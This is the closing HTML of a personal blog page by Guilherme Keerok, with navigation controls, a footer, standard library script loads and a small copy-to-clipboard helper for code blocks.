        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Guilherme Keerok
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
